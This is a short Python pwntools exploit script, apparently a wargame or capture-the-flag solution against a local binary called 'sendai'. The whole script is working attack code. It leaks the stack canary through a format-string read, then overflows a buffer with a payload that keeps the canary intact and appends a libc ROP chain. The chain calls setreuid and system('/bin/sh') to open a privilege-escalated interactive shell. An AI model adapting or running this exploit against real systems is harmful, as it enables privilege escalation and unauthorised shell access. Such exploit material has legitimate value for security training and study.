import sys
from pwn import *

context.arch = 'amd64'
io = process("/home/bonus03/sendai")

def send_data(data):
    io.recvuntil(b"Command: ")
    io.sendline(b"SEND:0")

    io.recvuntil(b"Data for conn 0: ")
    io.sendline(data)
    io.recvuntil(b"Sent: ")

io.recvuntil(b"Command: ")
io.sendline(b"CONNECT:0")

send_data(b"%33$p")

stack_canary = io.recvline().decode().strip()[2:]

print(stack_canary)

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc.address = 0x7ffff7c00000
rop = ROP(libc, badchars=b"\n")
rop.setreuid(1030, 1030)
rop.raw(rop.ret)
rop.system(next(libc.search(b"/bin/sh")))

payload = b"A" * 136
payload += p64(int(stack_canary, 16))
payload += b"A" * 8
payload += rop.chain()

send_data(payload)

io.sendline(b"QUIT")

io.interactive()
